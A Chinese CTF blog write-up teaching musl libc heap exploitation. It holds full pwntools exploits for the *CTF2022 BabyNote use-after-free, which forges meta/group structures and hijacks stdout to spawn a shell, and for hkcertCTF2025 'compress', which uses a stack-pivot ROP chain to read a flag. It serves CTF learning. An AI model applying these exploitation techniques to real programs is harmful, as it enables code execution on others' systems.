# 通过*ctf2022_babynote入门musl Pwn


<!--more-->

~~看到`hkcertctf`出了一道`musl`的题来学习一下~~

## 前言

基础知识部分就不详细列出了，列出一些我的参考文章。~~其实主要还是看源码~~



- {{< link href="https://9anux.org/2024/01/17/musl/" content=io板子 >}}
- {{< link href="https://bbs.kanxue.com/thread-269533.htm" content=源码分析 >}}
- {{< link href="https://bbs.kanxue.com/thread-274640-1.htm" content=主要参考文章：小小做题家之musl1.2.2的利用手法 >}}



利用手法：

- dequeue：用于任意地址写
- queue：把`fake_meta`链入`active`链表，从而进行任意地址的堆块分配
- IO：有通过`puts`和`exit`触发的



## 环境配置



### 编译`libc`

拿到题目的`musl libc`版本之后，最好自己编译一个`musl libc`，使用自己编译的`libc`启动题目有符号表能支持调试（有的题目给的`libc`没有符号表就调试不了），调试的时候还能看到`musl`的源码知道哪里出错了



{{< admonition type=note title="Note" open=true >}}

查看`musl libc`版本：

```
./libc.so
```

{{< /admonition >}}



```sh
git clone https://github.com/kraj/musl.git
cd musl
git checkout v1.2.2
CFLAGS="-g -O0" ./configure --prefix=$PWD/install
make -j$(nproc)
make install
```

这样`musl/install/lib`下就有没去符号表的`libc.so`



### 启动题目

```sh
patchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn
```

然后exp中直接

```
p = process("./pwn")
```

即可



如果没有`patchelf`，通过

```
./libc.so ./pwn
```

启动，会有点问题（虽然也不是不行）



### 调试

```sh
sudo apt install musl-dbgsym
git clone https://github.com/xf1les/muslheap.git  
echo "source /path/to/muslheap.py" >> ~/.gdbinit
```



| 命令                                         | 作用                                                         |
| -------------------------------------------- | ------------------------------------------------------------ |
| mheap                                        | 可以查看`__malloc_context`的部分信息，可以详细看到每一条`meta`链表 |
| p/x __malloc_context                         | 可以查看`__malloc_context`的详细信息，但无法详细看到每一条`meta`链表 |
| mmagic                                       | 用于查看关键函数的地址                                       |
| p/x *(struct meta*) <meta地址>               | 查看某个`meta`结构体的详细信息                               |
| p/x *(struct group*) <group地址>             | 查看`group`结构体详细信息                                    |
| mchunkinfo <addr>                            | 查看某个用户指针所属 `slot `的详细信息                       |
| mfindslot  <addr>                            | 从任意地址反向定位其所在 `slot`                              |
| p/x stdout                                   | 查看`stdout`结构体                                           |
| p/x *(struct meta_area*) <meta_area address> | 查看`meta_area`，`meta & 0xffffffffffff000`就能找到`meta_arena`结构体 |







## *CTF（星CTF）——Babynote



https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote



逆向分析，略。。。



### 漏洞

`add`的时候，把`global_note`给了`heap_ptr[4]`，`delete`的时候，没有把`heap_ptr[4]`中的`global_note`置0，存在`UAF`

```c
int __fastcall add(struct _IO_FILE *stderr)
{
  __int64 *heap_ptr; // [rsp+8h] [rbp-8h]

  heap_ptr = (__int64 *)calloc(1u, 0x28u);
  heap_ptr[2] = create_name(heap_ptr);
  heap_ptr[3] = create_note(heap_ptr + 1);
  heap_ptr[4] = global_note;
  global_note = (__int64)heap_ptr;
  return puts("ok");
}
```

```c
unsigned __int64 __fastcall delete(struct _IO_FILE *stderr)
{
  // ...
  ptr_1 = 0;
  size = create_name((__int64 *)&ptr_1);
  ptr = (void *)find_name(ptr_1, size);
  if ( ptr )
  {
    if ( ptr != (void *)global_note || *(_QWORD *)(global_note + 0x20) )// 要删除的是中间或末尾节点
    {
      if ( *((_QWORD *)ptr + 4) )
      {                                         // 遍历链表找到指向ptr的前一个节点的next指针位置
        for ( p_global_note = &global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note + 32) )
          ;
        *p_global_note = *((_QWORD *)ptr + 4);  // 更新前一个节点的next指针，从链表中移除ptr
      }
    }
    else
    {
      global_note = 0;                          // 要删除的是头节点且没有后继节点
    }
    free(*(void **)ptr);                        // 释放name指针
    free(*((void **)ptr + 1));                  // 释放note_content指针
    free(ptr);                                  // 释放节点本身
    puts("ok");
  }
  else
  {
    puts("oops.....");
  }
  free(ptr_1);
  // ...
}
```



### 流程

整体流程可以分为这三步：

- 泄露`elfbase`、`libc_base`
- 泄露`secret`
- 把堆块申请在`stdout`



#### 第一步

在前面两步泄露地址中，只需要关注`active[2]`这个链表（0x30大小）

`add`一次，申请一个`0x30`大小的`note1`，来防止`free`掉`group`中所有`chunk`时，将整个`group`归还给堆管理器

{{< admonition type=note title="Note" open=true >}}

接下来需要注意，`group`对`chunk`的管理策略：

- `malloc`的时候取的是`avail_mask`中最低位的堆块，也就是一个`group`中最低地址的堆块
- 被`free`掉的堆块，会把它的`free_mask`置1，`avail_mask`不动还是0
- 当一个`group`中没有`avail`堆块时，会把被`free`的堆块标记成`avail`，`free_mask`就置0了

{{< /admonition >}}

接着把`note2`申请到`active[2]`的第十个`chunk`的位置，`note2_content`申请到第二个的位置

申请`note3`，并把`note2`给`free`掉，此时`note3`还记录着`note2`的位置即第十个`chunk`的位置

接着在`note2_content`的位置申请`note4`，泄露出`note4`记录的两个堆地址

{{< admonition type=note title="Note" open=true >}}

musl申请的堆块，有的大小能泄露elfbase，有的能泄露libc

{{< /admonition >}}

```py
## leak libcbase && elfbase
add(0x38,b"a"*0x38,0x38,b"a"*0x38) #防止将整个group归还给堆管理器
cho(4)
for _ in range(8):
    find(0x28,"a"*0x28)
add(0x38,"2"*0x38,0x28,"2"*0x28)
add(0x38,"3"*0x38,0x38,"3"*0x38)
delet(0x38,"2"*0x38)
for _ in range(6):
    find(0x28,"a"*0x28)
add(0x38,"4"*0x38,0x58,"4"*0x58) #一个堆块泄露elfbase，一个libc
find(0x38,"2"*0x38)
p.recvuntil("0x28:")
libcbase=u64(p64(int(p.recv(16),16),endianness="big")) - 0xb7d60 #参考文章中，这里我本地不太对
libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的
elfbase=u64(p64(int(p.recv(16),16),endianness="big")) - 0x4c40
lg("libcbase")
lg("libcbase_true")
lg("elfbase")
```





#### 第二步

把原本`note2`中执行`content`的指针改成`malloc_context`，`show`即可

```py
# leak secret
for _ in range(6):
    find(0x28,b"a"*0x28)
pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0)
find(0x28,pd)
find(0x38,b"a"*0x38)
p.recvuntil("0x28:")
secret=u64(p64(int(p.recv(16),16),endianness="big"))
lg("secret")
```





#### 第三步

此时，能通过修改`note2_content`来进行任意地址读和`free`

有了`elfbase`、`libc_base`、`secret`，接下来就是把堆块申请到`stdout`上，通过`puts`打`IO`

把堆块申请到`stdout`上，需要：

- 在`stdout-0x10`伪造一个`group`。通过`dequeue`，在`stdout-0x10`写上`fake_group_addr`
- 利用`queue` 把`fake_meta`链入`active`链表







**dequeue**

触发`dequeue`需要`fake_meta`的构造：

1. 通过`get_meta()` 所有`assert`。包括：
	- `fake_meta`那个页的起始的`secret`要等于`malloc_context`的`secret`
	- `fake_meta` 中保存的 `group` 指针要正确
	- 被`free`掉的`chunk`的`index`小于等于`fake_meta->last_idx`
2. `nontrivial_free()` 进入 第一个 if 分支。包括：
	- `free_able == 1`
3. 伪造`prev`、`next`，通过`dequeue的unlink`写`stdout-0x10`

然后，通过任意地址`free`，`free`掉`fake_group`的第一个`chunk`，执行`dequeue`

```py
# set fake meta
add(0x28,b"5"*0x28,0x1200,'\n') #0x1200:防止将mmap出来的group归还给堆管理器
last_idx, freeable, sc, maplen = 0, 1, 8, 1
#fake meta
fake_meta = p64(stdout - 0x18)                  # prev
fake_meta += p64(fake_meta_addr + 0x30)         # next
fake_meta += p64(fake_mem_addr)                 # mem
fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0) #对齐
#fake group
fake_mem = p64(fake_meta_addr)                  # meta
fake_mem += p32(1) + p32(0)                    
payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置
#fake meta area
payload += p64(secret) + p64(0)
payload += fake_meta + fake_mem + b'\n'
find(0x1200,payload)

#设置stdout-0x10为fake_group_addr
# dequeue 2 set stdout_file - 0x10 (where the final fake group)
for _ in range(3):
   find(0x28,b"a"*0x28)
pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
add(0x38,b"6"*0x38,0x28,pd)
delet(0x38,b"a"*0x38) #dequeue
```









**queue**

触发`queue`还是需要通过`get_meta`的检查，然后就是走`nontrivial_free`的`else_if`分支：

- `freeable == 0`
- 这里`sc`等于几就是进第几个`active`链表，但是需要`sc<48`



```py
# queue 把fake_meta链入active[8]
# reset fake meta , free fake chunk 2 queue it(queue the fake meta)
last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta
fake_meta = p64(0)                              # prev
fake_meta += p64(0)                             # next
fake_meta += p64(fake_mem_addr)                 # mem
fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
fake_mem = p64(fake_meta_addr)                  # meta
fake_mem += p32(1) + p32(0)
payload = b'z' * 0xa90
payload += p64(secret) + p64(0)
payload += fake_meta + fake_mem + b'\n'
#z()
find(0x1200, payload)
for _ in range(2):
    find(0x28, b'a' * 0x28)
pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
add(0x38,b"7"*0x38,0x28,pd)
delet(0x38,b"a"*0x38)
lg("fake_meta_addr")
```



接着把`fake_meta->mem`改为`stdout-0x10`即可把堆块申请到`stdout`上了



### exp

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address,checksec=False)
libc = ELF("../musl-libc/v1.2.2")

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
lgaddr  = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
else:
    # p = process(["/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2",address])
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()


def cho(num):
    sla("option: ",str(num))
 

def add(namesz, name, notesz, note):
    cho(1)
    sla(b"name size: ", str(namesz))
    # sla(b"name: ", name)
    sa(b"name: ", name)
    sla(b"note size: ", str(notesz))
    # sla(b"note content: ", note)
    sa(b"note content: ", note)
 
def find(namesz,name):
    cho(2)
    sla("name size: ",str(namesz))
    # sla("name: ",name)
    sa("name: ",name)
 
def delet(namesz,name):
    cho(3)
    sla("name size: ",str(namesz))
    # sla("name: ",name)
    sa("name: ",name)
 
def remake():
    cho(4)

## leak libcbase && elfbase
add(0x38,b"a"*0x38,0x38,b"a"*0x38) #防止将整个group归还给堆管理器
cho(4)
for _ in range(8):
    find(0x28,"a"*0x28)
add(0x38,"2"*0x38,0x28,"2"*0x28)
add(0x38,"3"*0x38,0x38,"3"*0x38)
delet(0x38,"2"*0x38)
for _ in range(6):
    find(0x28,"a"*0x28)
add(0x38,"4"*0x38,0x58,"4"*0x58) #一个堆块泄露elfbase，一个libc
find(0x38,"2"*0x38)
p.recvuntil("0x28:")
libcbase=u64(p64(int(p.recv(16),16),endianness="big")) - 0xb7d60 #这里不太对
libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下
elfbase=u64(p64(int(p.recv(16),16),endianness="big")) - 0x4c40
lg("libcbase")
lg("libcbase_true")
lg("elfbase")

# calculate important addr
malloc_context = libcbase + 0xb4ac0
# mmap_base = libcbase - 0xa000
mmap_base = libcbase_true - 0x4000
fake_meta_addr = mmap_base + 0x2010
fake_mem_addr = mmap_base + 0x2040
# stdout = libcbase + 0xb4280   
stdout = libcbase_true + 0xdb2c0 
lg("malloc_context")
lg("mmap_base")
lg("fake_meta_addr")
lg("fake_mem_addr")
lg("stdout")

# leak secret
for _ in range(6):
    find(0x28,b"a"*0x28)
pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0)
find(0x28,pd)
find(0x38,b"a"*0x38)
p.recvuntil("0x28:")
secret=u64(p64(int(p.recv(16),16),endianness="big"))
lg("secret")

# set fake meta
add(0x28,b"5"*0x28,0x1200,'\n') #0x1200:防止将mmap出来的group归还给堆管理器
last_idx, freeable, sc, maplen = 0, 1, 8, 1
#fake meta
fake_meta = p64(stdout - 0x18)                  # prev
fake_meta += p64(fake_meta_addr + 0x30)         # next
fake_meta += p64(fake_mem_addr)                 # mem
fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0) #对齐
#fake group
fake_mem = p64(fake_meta_addr)                  # meta
fake_mem += p32(1) + p32(0)                    
payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置
#fake meta area
payload += p64(secret) + p64(0)
payload += fake_meta + fake_mem + b'\n'
find(0x1200,payload)

#设置stdout-0x10为fake_group_addr
# dequeue 2 set stdout_file - 0x10 (where the final fake group)
for _ in range(3):
   find(0x28,b"a"*0x28)
pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
add(0x38,b"6"*0x38,0x28,pd)
delet(0x38,b"a"*0x38) #dequeue

# queue 把fake_meta链入active[8]
# reset fake meta , free fake chunk 2 queue it(queue the fake meta)
last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta
fake_meta = p64(0)                              # prev
fake_meta += p64(0)                             # next
fake_meta += p64(fake_mem_addr)                 # mem
fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += p64(0)
fake_mem = p64(fake_meta_addr)                  # meta
fake_mem += p32(1) + p32(0)
payload = b'z' * 0xa90
payload += p64(secret) + p64(0)
payload += fake_meta + fake_mem + b'\n'
#z()
find(0x1200, payload)
for _ in range(2):
    find(0x28, b'a' * 0x28)
pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0)
add(0x38,b"7"*0x38,0x28,pd)
delet(0x38,b"a"*0x38)
lg("fake_meta_addr")

## reset fake meta's group at stdout_file -0x10
last_idx, freeable, sc, maplen = 1, 0, 8, 0
fake_meta = p64(fake_meta_addr)                 # prev
fake_meta += p64(fake_meta_addr)                # next
fake_meta += p64(stdout - 0x10)                 # mem
fake_meta += p32(1) + p32(0)                    # avail_mask, freed_mask
fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
fake_meta += b'a' * 0x18
fake_meta += p64(stdout - 0x10)
payload = b'y' * 0xa80
payload += p64(secret) + p64(0)
payload += fake_meta + b'\n'
find(0x1200, payload)

# calloc to edit stdout 2 IO_attack
cho(1)
sla('name size: ', str(0x28))
sa('name: ', '\n')
sla('note size: ', str(0x80))#sc为8
fake_IO  = b'/bin/sh\x00'                       # flags
fake_IO += p64(0)                               # rpos
fake_IO += p64(0)                               # rend
fake_IO += p64(libcbase + 0x5c9a0)              # close
fake_IO += p64(1)                               # wend
fake_IO += p64(0)                               # wpos
fake_IO += p64(0)                               # mustbezero_1
fake_IO += p64(0)                               # wbase
fake_IO += p64(0)                               # read
fake_IO += p64(libcbase_true + libc.sym['system'])  # write
##z()
sl(fake_IO)



itr()
# find bbase 0x1685
# bbase 0x178c
# bbase 0x1798
```





## hkcertCTF2025 _ compress

`musl v1.1.24`



有个`gadget`可以进行栈迁移：

```asm
pwndbg> x/20i 0x49503+0x7ffff7c00000
   0x7ffff7c49503 <longjmp+11>: mov    rbx,QWORD PTR [rdi]
   0x7ffff7c49506 <longjmp+14>: mov    rbp,QWORD PTR [rdi+0x8]
   0x7ffff7c4950a <longjmp+18>: mov    r12,QWORD PTR [rdi+0x10]
   0x7ffff7c4950e <longjmp+22>: mov    r13,QWORD PTR [rdi+0x18]
   0x7ffff7c49512 <longjmp+26>: mov    r14,QWORD PTR [rdi+0x20]
   0x7ffff7c49516 <longjmp+30>: mov    r15,QWORD PTR [rdi+0x28]
   0x7ffff7c4951a <longjmp+34>: mov    rdx,QWORD PTR [rdi+0x30]
   0x7ffff7c4951e <longjmp+38>: mov    rsp,rdx
=> 0x7ffff7c49521 <longjmp+41>: mov    rdx,QWORD PTR [rdi+0x38]
   0x7ffff7c49525 <longjmp+45>: jmp    rdx
```



打`io_file`

`show`泄露出libc，add通过负数偏移，能写libc中的内容

写`stdin`，`stdout`不能动，接着往下写rop，栈迁移进行rop

```py
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')

address = './pwn'
# address = './pwn_patched'
elf = ELF(address,checksec=False)
libc = elf.libc

#-----------------------------------------------------------------
s       = lambda data               :p.send(data)
ss      = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sls     = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num                :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
lgaddr  = lambda s,addr		        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg      = lambda s			        : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
r64     = lambda                    :u64(p.recv(6).ljust(8,b'\x00'))
ir64    = lambda                    :int(p.recv(14),16)
#-----------------------------------------------------------------
gdbscript = \
"""
    
    c
"""
if len(sys.argv) > 1 and sys.argv[1] == "r":
    p = remote("host.docker.internal",9999 )
else:
    p = process(address)

def dbg():
    gdb.attach(p)
    # gdb.attach(p, gdbscript=gdbscript)
    # pause()

def add(offset, content):
    """调用 add 函数
    offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞）
    content: 要写入的内容
    """
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'Please input the offset:\n', str(offset).encode())
    p.sendafter(b'Please input the Content:\n', content)

def show():
    """调用 show 函数"""
    p.sendlineafter(b'>>', b'2')

show()
libc_base = r64() - 0x282e50 - 0x10000
lg("libc_base")


#    0x7ffff7c49503 <longjmp+11>: mov    rbx,QWORD PTR [rdi]
#    0x7ffff7c49506 <longjmp+14>: mov    rbp,QWORD PTR [rdi+0x8]
#    0x7ffff7c4950a <longjmp+18>: mov    r12,QWORD PTR [rdi+0x10]
#    0x7ffff7c4950e <longjmp+22>: mov    r13,QWORD PTR [rdi+0x18]
#    0x7ffff7c49512 <longjmp+26>: mov    r14,QWORD PTR [rdi+0x20]
#    0x7ffff7c49516 <longjmp+30>: mov    r15,QWORD PTR [rdi+0x28]
#    0x7ffff7c4951a <longjmp+34>: mov    rdx,QWORD PTR [rdi+0x30]
#    0x7ffff7c4951e <longjmp+38>: mov    rsp,rdx
# => 0x7ffff7c49521 <longjmp+41>: mov    rdx,QWORD PTR [rdi+0x38]
#    0x7ffff7c49525 <longjmp+45>: jmp    rdx
libc.address = libc_base
magic_gadget = libc_base + 0x49503
pop_rdi_ret = libc_base + 0x14862
pop_rsi_ret = libc_base + 0x1c237
pop_rdx_ret = libc_base + 0x1bea2
pop_rax_ret = libc_base + 0x1b826
ret = libc_base + 0xcdc
fake_file_addr = libc_base + 0x292200
libc_end_addr = libc_base + 0x296000
stdin_addr = libc_base + 0x292200
stdout_addr = libc_base + 0x292300
rop_addr = libc_base + 0x292430

stdout_struct = (
    p64(0x45) +                    # +0x00
    p64(0x0) +                     # +0x08
    p64(0x0) +                     # +0x10
    p64(libc_base + 0x4a957) +     # +0x18
    p64(libc_base + 0x39a8) +  # +0x20
    p64(libc_base + 0x39a8) +  # +0x28
    p64(0x0) +                     # +0x30
    p64(libc_base + 0x39a8) +  # +0x38
    p64(0x0) +                     # +0x40
    p64(libc_base + 0x4aac3) +     # +0x48
    p64(libc_base + 0x4aabb) +     # +0x50
    p64(libc_base + 0x39a8) +  # +0x58
    p64(0x0) +                     # +0x60
    p64(0x0) +                     # +0x68
    p64(0x0) +                     # +0x70
    p64(0x1) +                     # +0x78
    p64(0x0) +                     # +0x80
    p64(0xffffffffffffffff) +      # +0x88
    p64(0xffffffff) +              # +0x90
    p64(0x0) +                     # +0x98
    p64(0x0) +                     # +0xA0
    p64(0x0)                       # +0xA8
)
stdout_struct = stdout_struct.ljust(0xf0, b'\x00')


#0x85
rop = b''
# rop += p64(pop_rdi_ret)
# rop += p64(fake_file_addr) #flag
rop += p64(pop_rsi_ret)
rop += p64(0)
rop += p64(libc.sym['open'])

rop += p64(pop_rdi_ret)
rop += p64(3)
rop += p64(pop_rsi_ret)
rop += p64(libc_end_addr-0x100)
rop += p64(pop_rdx_ret)
rop += p64(0x100)
rop += p64(libc.sym['read'])

rop += p64(pop_rdi_ret)
rop += p64(1)
rop += p64(pop_rsi_ret)
rop += p64(libc_end_addr-0x100)
rop += p64(pop_rdx_ret)
rop += p64(0x100)
rop += p64(libc.sym['write'])

fake_file = b""
fake_file += b"./flag".ljust(8, b'\x00')  # flags
fake_file += p64(0)  # rpos rbp
fake_file += p64(0)  # rend r12
fake_file += p64(0)  # close r13
fake_file += p64(0)  # wend r14
fake_file += p64(0)  # wpos r15
fake_file += p64(rop_addr)  # mustbezero_1 rdx rsp
fake_file += p64(ret)  # wbase rip
fake_file += p64(0)  # read
fake_file += p64(magic_gadget)  # write
fake_file = fake_file.ljust(0xf0, b'\x00')  # lock = 0

pl = p64(0)*4
pl +=  fake_file + p64(0)*2
pl+=  stdout_struct
pl += b"\x00"*0x40
pl += rop
# dbg()
add(-0x30e0-0x100,pl)

# 0x0000000000025b40 : push rax ; ret


itr()
# b *0x7ffff7c00000+0x49503
# stdin dq 0x00007ffff7e92200 32 
# bbase 0xa9f
# sbase 0x201FE0
# 0x781e1ce953c0
```



---

> Author:    
> URL: http://localhost:1313/posts/musl_pwn/  

